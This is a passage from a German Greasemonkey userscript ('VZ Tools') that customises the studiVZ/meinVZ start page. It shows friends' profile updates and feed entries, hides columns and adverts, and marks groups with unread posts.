       var pic = nodes[i].childNodes[1].childNodes[1].childNodes[1].src;
       var id = url.substring(url.length - 16, url.length);
      
       var out = "";
       var updated = nodes[i].getElementsByClassName('lastUpdate');
       if (updated[0]) {
         updated = updated[0].innerHTML;
	         var updatetype = nodes[i].getElementsByClassName('lastUpdateTypeName')[0].innerHTML;
	         if ((updatetype) && (updatetype != "(Ist gerade ...)")) {
	           if (updatetype == "") {
	             updatetype = "etwas";
	           }
	           lastact = updated;
	           if (updatetype == "(Profilfoto)") {
	             out = '<b>hat <span name="picturelink" id="'+pic+'" title="'+name+'s neues Profilfoto anzeigen" style="font-style: italic; border-bottom: 1px dotted #000000; cursor: pointer;">'+updatetype.substring(1,updatetype.length - 1)+'</span> aktualisiert.</b>';
	           }else{
	             out = '<b>hat <span style="font-style: italic;">'+updatetype.substring(1,updatetype.length - 1)+'</span> aktualisiert.</b>';
	           }
	         }
	         var det = new Array(url, name, out);
	         a_details.push(det);
       }
     }
     getBush();
   }
 });
}

function makeLinks(text) {
    var exp = /(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/i;
    return text.replace(exp,"<a href='$1' target='_blank'>$1</a>"); 
}


var a_bush;

function getBush() {
  a_bush = new Array();
  details = '';
  GM_xmlhttpRequest({
   method:"GET",
   url: url + "Feeds",
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var friends = document.createElement('div');
     friends.innerHTML = response.responseText;
     var tags = friends.getElementsByClassName('feedEntry');
	   var nodes = [];
	   for (var n = 0; n < tags.length; n++) {
	       nodes[nodes.length] = tags[n].wrappedJSObject;
	   }
	   for (var n = 0; n < nodes.length; n++) {   
	     var name = nodes[n].getElementsByTagName('a')[0].innerHTML;
	     var url = nodes[n].getElementsByTagName('a')[0].getAttribute('href');
	     var what = trim(nodes[n].innerHTML.split('</a>')[1]);	     
	         what = makeLinks(what);
	     var when = nodes[n].parentNode.getElementsByTagName('div')[1].getElementsByTagName('span')[0].innerHTML;
	     var det = new Array(url, name, what, when);
	     a_bush.push(det);
	   }
  outputProfileChanges();
  }
	});
}

// Profiländerungen ausgeben:
function outputProfileChanges() {
         var details = "";
         GM_getValue(s_prefix + 'f_profile',1);
				 if (GM_getValue(s_prefix + 'f_status',1) == 1) {
         // Buschfunk:
         var i = 0;
         var k = 0;
         while (true) {
           if (a_bush[i][3] !== 'x') {
             var hidelink = '';             
             var url = a_bush[i][0];
             var l = 0;
             var more = '';
             for (var j = (i + 1); j < a_bush.length; j++) {
               if (trim(a_bush[j][0]) == trim(url)) {
                 more += '<br />&raquo; '+a_bush[j][2]+' &laquo; <small style="color: #C0C0C0">('+a_bush[j][3]+')</small><br />';
                 a_bush[j][3] = 'x';
                 l++;
               }
             }
             var content = '&raquo; '+a_bush[i][2]+' &laquo; <small style="color: #C0C0C0">('+a_bush[i][3]+')</small>';
             if (l > 0) {
 						   content += '&nbsp;<small><b><a href="#" onClick="if (document.getElementById(\'more_'+a_bush[i][0]+'\').style.display == \'block\') {document.getElementById(\'more_'+a_bush[i][0]+'\').style.display = \'none\'}else{document.getElementById(\'more_'+a_bush[i][0]+'\').style.display = \'block\';}">(+'+l+' &darr;&uarr;)</a></b></small><span style="display: none;" id="more_'+a_bush[i][0]+'">';
               content += more;
               content += "</span>";
             }
             if (GM_getValue(s_prefix + 'f_details_tabular', 1) == 0) {
               details += '<tr><td valign="top" style="border-bottom: 1px solid #C0C0C0;"><nobr><b><a href="'+a_bush[i][0]+'">'+ a_bush[i][1] + '</a>:&nbsp;</b></nobr><span id="bush_'+a_bush[i][0]+'"> '+content+' </td><td style="border-bottom: 1px solid #C0C0C0;" valign="top">'+hidelink+'</td></tr>';
             }else{
               details += '<tr><td valign="top" style="border-bottom: 1px solid #C0C0C0;"><nobr><b><a href="'+a_bush[i][0]+'">'+ a_bush[i][1] + '</a>:&nbsp;</b></nobr></td><td style="border-bottom: 1px solid #C0C0C0;" id="bush_'+a_bush[i][0]+'">'+content+'</td><td style="border-bottom: 1px solid #C0C0C0;" valign="top">'+hidelink+'</td></tr>';
             }
             k++;
           }
           i++;
           if (i == a_bush.length) {
             break;
					 }
					 if (k == GM_getValue(s_prefix + 'bush_num',6)) {
					   break;
					 }
         }
         }
         if (GM_getValue(s_prefix + 'f_profile',1) == 1) {
         // Aktualisierungen:
         for (var i = 0; i < Math.min(a_details.length, GM_getValue(s_prefix + 'f_num',4)); i++) {
           var hidelink = '';
           if (a_details[i][2] != "") {
             if (GM_getValue(s_prefix + 'f_details_tabular', 1) == 0) {
               details += '<tr><td valign="top" style="border-bottom: 1px solid #C0C0C0;"><nobr><b><a href="'+a_details[i][0]+'">'+ a_details[i][1] + '</a>:&nbsp;</b></nobr>'+a_details[i][2]+' </td><td style="border-bottom: 1px solid #C0C0C0;" valign="top">'+hidelink+'</td></tr>';
             }else{
               details += '<tr><td valign="top" style="border-bottom: 1px solid #C0C0C0;"><nobr><b><a href="'+a_details[i][0]+'">'+ a_details[i][1] + '</a>:&nbsp;</b></nobr></td><td style="border-bottom: 1px solid #C0C0C0;">'+a_details[i][2]+' </td><td style="border-bottom: 1px solid #C0C0C0;" valign="top">'+hidelink+'</td></tr>';
             }
           }
         }
         }
         var details = '<table cellspacing="0">'+details+'</table><br />&nbsp;';
         GM_setValue(s_prefix + 'friends_cache', details);
         document.getElementById('friends_details').innerHTML = details;
         var piclinks = document.getElementsByName('picturelink');
         for (var n = 0; n < piclinks.length; n++) {
           piclinks[n].wrappedJSObject.addEventListener('click', showFriendsPicture, true);
         }
         document.getElementById('reloader').src = reload_icon;
}

// Ausgeblendete Einträge wiederherstellen
removeHiddenMB = function() {
  var list = GM_listValues();
  for(var i = 0; i < list.length; i++) {
    if(list[i].indexOf(s_prefix + 'hidemb_') > -1) {
      GM_deleteValue(list[i]);
    }
  }
  alert('Alle ausgeblendeten Microblog-Einträge wurden wiederhergestellt.');
}

// Hilfsfunktion: Query-String parsen
function gup( name )
{
  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
  var regexS = "[\\?&]"+name+"=([^&#]*)";
  var regex = new RegExp( regexS );
  var results = regex.exec( window.location.href );
  if( results == null )
    return "";
  else
    return results[1];
}

// Aktualisiertes Profilbild anzeigen
function showFriendsPicture(event) {
  var name = event.wrappedJSObject.target.title;
  var picsource = event.wrappedJSObject.target.id;
  picsource = picsource.substring(0, picsource.length - 6) + '.jpg';
  dialog = unsafeWindow.Phx.UI.Dialog.ButtonDialog(
                        name,
                        {
                            'message' : '<center><img src='+picsource+' /><br /><br /><a href="javascript:void(null)" id="closefp" ><b>[Schließen]</b></a></center>',
                            'buttons' : [ ]
                        });
  dialog.show();
  document.getElementById('closefp').addEventListener('click',function (e) {dialog.close();},false);
}

// == ENDE Freundesdetails Startseite ==

// == START Anpassungen der Startseite ==

// Webslice anzeigen
showWebSlice = function() {
  insert = document.getElementsByClassName("teaserbox")[1].getElementsByClassName('text')[0].wrappedJSObject;
  var webslice = document.createElement('iframe');
	
  webslice.src = '/WebSlice';
  webslice.setAttribute('frameborder', 0);
  webslice.setAttribute('width', '100%');
  webslice.setAttribute('height', '250');
  insert.appendChild(webslice);
}


// Spalten ausblenden
function hideColumns() {  
  var element_width = 430;
  var item_width = 320;
  if ((GM_getValue(s_prefix + 'hide_right_column', 0) == 1) && (GM_getValue(s_prefix + 'hide_left_column', 0) == 1)) {
    element_width = 600;
    item_width = 490;
  }
  
  // Rechte Spalte
  if (GM_getValue(s_prefix + 'hide_right_column', 0) == 1) {
    addGlobalStyle('#startRight { display: none !important; }');
    addGlobalStyle('#startLeft { width: 600px !important; }');
    addGlobalStyle('#startLeft .text { width: '+element_width+'px !important;}');
    addGlobalStyle('#startLeft .text h2 { width: '+element_width+'px !important;}');
    addGlobalStyle('#startLeft .text li { width: '+element_width+'px !important;}');
    addGlobalStyle('#startLeft .text .obj-thumbnaillist li { width: 60px !important;}');
    addGlobalStyle('#startLeft .text table { width: '+element_width+'px !important;}');
  }
  
  // Linke Spalte
  if (GM_getValue(s_prefix + 'hide_left_column', 0) == 1) {
    addGlobalStyle('#startLeft .image { display: none !important;}');
    addGlobalStyle('#startLeft .text { width: '+element_width+'px !important;}');
    addGlobalStyle('#startLeft .right-column { width: '+element_width+'px !important;}');
    addGlobalStyle('#startLeft .right-column h2 { width: '+element_width+'px !important;}');
    addGlobalStyle('#startLeft .text h2 { width: '+element_width+'px !important;}');
    addGlobalStyle('#startLeft .text li { width: '+element_width+'px !important;}');
    addGlobalStyle('#startLeft .text .obj-thumbnaillist li { width: 60px !important;}');
    addGlobalStyle('#notesandbookmarks { padding-left: 0px !important;}');
    addGlobalStyle('#startLeft .text table { width: '+element_width+'px !important;}');
  }
  
  // Schaufenster
  if (GM_getValue(s_prefix + 'hide_showcase', 0) == 1) {
    if (document.getElementById('showcase_staticContent')) {
      document.getElementById('showcase_staticContent').parentNode.removeChild(document.getElementById('showcase_staticContent'));
    }
  }
  
  // Wahlzentrale
  if (GM_getValue(s_prefix + 'hide_election', 0) == 1) {
    addGlobalStyle('#wahlzentrale_staticContent {display: none !important;}');
  }
  
  // Telegramm
  if (GM_getValue(s_prefix + 'hide_telegram', 0) == 1) {
    addGlobalStyle('#telegram_staticContent {display: none !important;}');
  }
  
  // AhaOho
  if (GM_getValue(s_prefix + 'hide_ahaoho', 0) == 1) {
    addGlobalStyle('#AdLinkAhaOhoBirthdayCard { display: none !important;}');
  }
  
  // Vodafone
  if (GM_getValue(s_prefix + 'hide_vodafone', 0) == 1) {
    addGlobalStyle('#advertisement-feeds { display: none !important;}');
  }
  
  // SMS
  if (GM_getValue(s_prefix + 'hide_sms', 0) == 1) {
    var elements = document.getElementsByClassName('text');
    for (var i = 0; i < elements.length; i++) {
      var element = elements[i];
      if (element.innerHTML.indexOf('SMS-Benachrichtigungen') != -1) {
        element.getElementsByTagName('div')[5].setAttribute('style','display: none !important');
      }
    }        
  }
  
  
  // Einladungen
  if (GM_getValue(s_prefix + 'hide_invitation', 0) == 1) {
    addGlobalStyle('#mod-invitation-invitationbox { display: none !important;}');
  }
  
  // Neuigkeiten
  if (GM_getValue(s_prefix + 'hide_news', 0) == 1) {
    addGlobalStyle('#news_staticContent { display: none !important;}');
  }
  if (GM_getValue(s_prefix + 'hide_news_select', 0) == 1) {
    if ((document.getElementById('news_staticContent')) && 
        (document.getElementById('news_staticContent').getElementsByClassName('ad').length > 0)) {
      addGlobalStyle('#news_staticContent { display: none !important;}');
    }
  }
  
  // Buschfunk
  if (GM_getValue(s_prefix + 'hide_bush', 0) == 1) {
    addGlobalStyle('#Mod-Feedbox-Snipplet { display: none }');
  }
  
  // Datenschutz
  if (GM_getValue(s_prefix + 'hide_policy', 1) == 1) {
    addGlobalStyle('#policyFooter { display: none }');
  }
  
}

showAlerts = function() {
  var insert = document.createElement('div');
  insert.setAttribute('id','toppageinsert');
  insert.setAttribute('style', 'margin-bottom: 10px; margin-left: 10px;');
  var prepare = '';
      if (GM_getValue(s_prefix + '_support_invite', 0) == 0) {
        prepare += '<div id="supportgroup" style="font-size: 7pt; margin-bottom: 10px; padding: 5px; background-color: #ffff80; border: 1px solid #c0c000;">';
        prepare += '<b>Wußtest Du schon?</b><br />';
        prepare += 'Für VZ Tools gibt es bei studiVZ und meinVZ eine Support- und Fangruppe, in der Du Schwierigkeiten mit VZ Tools diskutieren, neue Vorschläge posten und Dir helfen lassen kannst.<br /><br />';
        prepare += 'Ich empfehle Dir unbedingt, dieser Gruppe beizutreten, um das bestmögliche Erlebnis mit VZ Tools zu gewährleisten. Weitere Details findest Du auch in der Hilfe von VZ Tools.<br /><br />';
        prepare += '<center><a href="javascript:void(null)" id="link_help">[Hilfe anzeigen]</a>&nbsp;&nbsp;&nbsp;<a href="/Groups/Overview/f1b245e816b2c967" id="link_group">[Zur Gruppe]</a>&nbsp;&nbsp;&nbsp;<a href="javascript:void(null)" id="link_nogroup">[Ausblenden]</a>';
        prepare += '</div>';
      }
      prepare += '<div id="friendalert" style="display: none; margin-bottom: 10px; padding: 5px; background-color: #FFA0A0; font-weight: bold; text-align: center;"></div>';

      prepare += '<ul id="newguestbook" style="border: none; margin: 0px; padding: 0px; display: none;">'+
		  					 '<li class="no-float" style="margin: 0px; padding-top: 2px; padding-bottom: 2px; border-bottom: 1px solid '+color1+'"><div class="float-left" style="font-weight: bold;"><span id="numng">0</span> neue Pinwanndeinträge!</div><div class="float-right text-right"><a href="/Pinboard/'+profId+'/p/1">anzeigen</a></div></li>'+
		  					 '</ul>';

      prepare += '<ul id="newpictures" style="margin: 0px; padding: 0px; display: none;">'+
		  					 '<li class="no-float" style="margin: 0px; padding-top: 2px; padding-bottom: 2px; border-bottom: 1px solid '+color1+'"><div class="float-left" style="font-weight: bold;"><span id="numnp">0</span> neue Bildverlinkungen!</div><div class="float-right text-right"><a href="/Photos/Tags/'+profId+'">anzeigen</a></div></li>'+
		  					 '</ul>';
	insert.innerHTML = prepare;
	document.getElementById('startLeft').insertBefore(insert, document.getElementById('startLeft').firstChild);
	getNumberOfGuestbook(false);
	getNumberOfPictures(false);
	getNumberOfFriends(false);
	if (document.getElementById('link_help')) {
	  document.getElementById('link_help').addEventListener('click', showHelp, true);
	  document.getElementById('link_nogroup').addEventListener('click', hideSupportAlert, true);
	}
}

hideSupportAlert = function() {
  GM_setValue(s_prefix + '_support_invite', 1);
  document.getElementById('supportgroup').style.display = 'none';
}

// == ENDE Anpassungen der Startseite ==

// == BEGINN Gruppenfunktionen ==
var unreadGroups = 0;

loadUnreadGroups = function(unreadGroups, page, visit) {
  var stop = false;
  
  GM_xmlhttpRequest({
   method: "GET",
   url: url + "Groups/c/3/o/d/p/"+page,
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var groups = document.createElement('div');
     groups.innerHTML = response.responseText;
		 rows = groups.getElementsByTagName('tr');
		 if (rows.length == 1) {
		   stop = true;
		   if (unreadGroups > 0) {
	       document.getElementById('Grid-Navigation-Main').getElementsByTagName('li')[4].getElementsByTagName('a')[0].style.fontWeight = 'bold';
	       document.getElementById('Grid-Navigation-Main').getElementsByTagName('li')[4].getElementsByTagName('a')[0].innerHTML = 'Meine Gruppen ('+unreadGroups+')';
	     }
		 }
		 if (!stop) {
			 for (var i = 1; i < rows.length; i++) {
			   if (rows[i].getElementsByTagName('td')[0].getAttribute('colspan') != '5') {
			     var link = rows[i].getElementsByTagName('a')[0].href;
			     var groupid = link.split('/')[link.split('/').length - 1];
			     var groupcount = rows[i].getElementsByClassName('entries')[0].innerHTML;
			     if (visit == groupid) {
			       GM_setValue(s_prefix + 'group'+groupid, groupcount);
			     }
			     if ((GM_getValue(s_prefix + 'group'+groupid, '') != groupcount) && (GM_getValue(s_prefix + 'group'+groupid, '') != 'ignore')) {
			       unreadGroups++;
			     }
			   }
			 }
		   loadUnreadGroups(unreadGroups, page + 1);
     }
   }
 });  
}

var icon_unread = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAB3RJTUUH2QcTDSQaDTtIqQAAAAlwSFlzAAALEwAACxMBAJqcGAAAAARnQU1BAACxjwv8YQUAAALZSURBVHja7VbLSltRFF255mrUqlVU1PjCGKsFJSMVQZw6Kf0Bv6BT8Q+cZtrPKHTmH4gzn6CIIiI+wAch0YZEc3vX3dnJyQNJYqBQsuEQzTl77bXX2uco0IhG/OPwfXfXb8D5AEYzcarMybgrDU10otEoVle/IR5PwHG5+CrCc7L5nyomoNgdHR3Y2vrlW1//4fc2wuEIgsGwuyEH3t7qKLIRTU1CIh4HQqGv/EoI2PYfxGLA4SEwPe325DaVTte3uG3Dq3F8DIyMuMY1J/MELAsYHZXPgwNgcBAYHhYlMplKLSkvOTHZ+cUFcHMDTE4KNonkCLAIV08PEIkAp6fA7i6tIVPg9bV2yZNJwSMOsfmp9XIEGOyWspPxzAxwfQ3s7Ykyvb3Vk/C70Hd3wOUlMDYGDA1JUdagHY5jEFCps6y8z4EBoLMTODkBHh6A8XEhZw4oreF3BNNcds2fz86k2Ows0NYmDWSLmrWsAgV0Q9VoaQHm5gTg6EiGiAUJpt08PclUM4d7PMOzzGEuMXiuGL9AAf5idqGhA0gburuB83ORlZJyWLe3ZbDW1mS46DXBp6bgXWmjUMlwFhBQVsUEzAR2Qktub4XI/j52Njfx2d3+srIi0lMJWsez7+EZe1augMpjLmVKma+u5JYsLOQ8TbmpP5lPJfr6gPl5OcOzzDGVLbdKrqEOGGXnSqUEiB3x8SAY/WQx94oub2xgORQCJiaA1lbZ4yfPPj6KWrROp17tKLHAZKmPTiIhBFgsEJDBU2L0d3ERWFoScPNWaPT3yxtAIrz77e35woYFhQpwk4WenyWBIOqZP/9keMF5KOqmZG5oFRdV5CKmXtOyCry8SBd8itm1WmJZ+FCoGvf3+YEuIEDvWJzScoi0K7KtV3A2eJ1pCWtlX1YhQI+CQTmoT26tf4DeCzbFmWLYti9PIBDIeJuxWC3/GVXPtKuLimSqzmtEIxrxX8ZfA9eFr7UUQR8AAAAASUVORK5CYII=";
var icon_read = "data:image/png;base64,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";
var icon_ignore = "data:image/png;base64,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";

showUnreadGroups = function() {
  if ((window.location.href.indexOf('Groups') > -1)) {
    var rows = document.getElementsByTagName('tr');
    for (var i = 1; i < rows.length; i++) {
      if (rows[i].getElementsByTagName('td')[0].getAttribute('colspan') != '5') {
			     var link = rows[i].getElementsByTagName('a')[0].href;
			     var groupid = link.split('/')[link.split('/').length - 1];
			     var groupcount = rows[i].getElementsByClassName('entries')[0].innerHTML;
			     if (GM_getValue(s_prefix + 'group'+groupid, '') == groupcount) {
			       var icon = document.createElement('img');
			       icon.src = icon_read;
			       icon.style.display = 'block';
			       icon.style.marginTop = '10px';
			       icon.setAttribute('groupid',groupid);
			       icon.style.cursor = 'pointer';
			       icon.addEventListener('click', markAsIgnored, false);
			       icon.setAttribute('title', "Nicht mehr überwachen (Zwei mal klicken: Als ungelesen markieren)");
			       rows[i].getElementsByClassName('entries')[0].appendChild(icon);
			     }else if (GM_getValue(s_prefix + 'group'+groupid, '') == 'ignore') {
			       var icon = document.createElement('img');
			       icon.src = icon_ignore;
			       icon.style.display = 'block';
			       icon.style.marginTop = '10px';
			       icon.setAttribute('groupid',groupid);
			       icon.style.cursor = 'pointer';
			       icon.addEventListener('click', markAsUnread, false);
			       icon.setAttribute('title', 'Als ungelesen markieren (Zwei mal klicken: Als gelesen markieren)');
			       rows[i].getElementsByClassName('entries')[0].appendChild(icon);
			     }else{
			       rows[i].getElementsByClassName('entries')[0].style.fontWeight = 'bold';
			       rows[i].getElementsByClassName('updated')[0].style.fontWeight = 'bold';
			       rows[i].getElementsByClassName('updated')[0].style.backgroundColor = color2;
